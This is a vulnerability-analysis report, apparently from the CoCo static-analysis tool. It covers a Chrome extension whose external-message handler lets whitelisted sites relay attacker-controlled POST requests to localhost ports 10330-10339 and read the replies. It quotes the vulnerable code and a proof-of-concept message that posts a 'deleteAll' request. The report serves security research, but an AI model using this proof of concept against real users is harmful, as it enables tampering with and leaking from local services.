# CoCo Analysis: nligaijmpjfocilngmacfhfifakkmcgj

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3

---

## Sink 1: bg_chrome_runtime_MessageExternal → XMLHttpRequest_url_sink

**CoCo Trace:**

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nligaijmpjfocilngmacfhfifakkmcgj/opgen_generated_files/bg.js
Line 988: `sendHttpRequestToLS(request["arg"], sendResponse);`
Line 1070: `if (!re.test(reqObj.url)) {`

**Code:**

```javascript
// Background script - External message listener
chrome.runtime.onMessageExternal.addListener(
    function(request, sender, sendResponse) {
        if (request["command"] === "sendToLs") {
            sendHttpRequestToLS(request["arg"], sendResponse); // attacker-controlled request["arg"]
            return true;
        }
        // ...
    }
);

function sendHttpRequestToLS(reqObj, callback) {
    console.log("sendHttpRequestToLs");
    var httpReq = new XMLHttpRequest();

    // Validation: send only to localhost
    var re = /http:\/\/(localhost|127\.0\.0\.1):1033\d\/.*/;
    if (!re.test(reqObj.url)) { // attacker-controlled reqObj.url
        console.log('Error: only localhost supported');
        callback({res: "error", errMess: 'Error: only localhost supported'});
        return
    }

    httpReq.open("POST", reqObj.url); // SSRF to localhost:10330-10339
    httpReq.setRequestHeader("Content-Type", "application/json; charset=utf-8");

    httpReq.onreadystatechange = function () {
        var DONE = 4;
        var OK = 200;
        if (httpReq.readyState === DONE) {
            if (httpReq.status === OK) {
                console.log(httpReq.responseText);
                callback({res: "success", obj: JSON.parse(httpReq.responseText)});
            } else {
                console.log('Error: ' + httpReq.status);
                callback({res: "error", errMess: 'Error: ' + httpReq.status});
            }
        }
    };

    httpReq.send(reqObj.data); // attacker-controlled POST body
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any whitelisted domain (e.g., https://www.e-security.kz/*, https://*.halykbank.kz/*)
// or any extension can send:
chrome.runtime.sendMessage(
    'nligaijmpjfocilngmacfhfifakkmcgj',
    {
        command: "sendToLs",
        arg: {
            url: "http://localhost:10330/admin/delete",
            data: JSON.stringify({action: "deleteAll"})
        }
    },
    function(response) {
        console.log(response); // Receives response from localhost
    }
);
```

**Impact:** SSRF to localhost ports 10330-10339. An attacker from whitelisted domains can make arbitrary POST requests to the user's localhost services on these ports with controlled URL paths and POST body data, and receive the responses back. This allows attacking local services that may not have authentication when accessed from localhost.

---

## Sink 2: bg_chrome_runtime_MessageExternal → XMLHttpRequest_post_sink

**CoCo Trace:**

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nligaijmpjfocilngmacfhfifakkmcgj/opgen_generated_files/bg.js
Line 988: `sendHttpRequestToLS(request["arg"], sendResponse);`
Line 1094: `httpReq.send(reqObj.data);`

**Classification:** TRUE POSITIVE (same vulnerability as Sink 1)

**Reason:** This is the same flow as Sink 1, tracking the POST body sink. The attacker controls both the URL and the POST data sent to localhost.

---

## Sink 3: XMLHttpRequest_responseText_source → sendResponseExternal_sink

**CoCo Trace:**

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nligaijmpjfocilngmacfhfifakkmcgj/opgen_generated_files/bg.js
Line 332: `XMLHttpRequest.prototype.responseText = 'sensitive_responseText';`
Line 1086: `callback({res: "success", obj: JSON.parse(httpReq.responseText)});`

**Classification:** TRUE POSITIVE (part of same vulnerability as Sink 1)

**Reason:** This tracks the response path where data from the localhost SSRF is sent back to the external attacker via sendResponse. This completes the full attack chain allowing the attacker to both send requests to localhost and receive the responses.
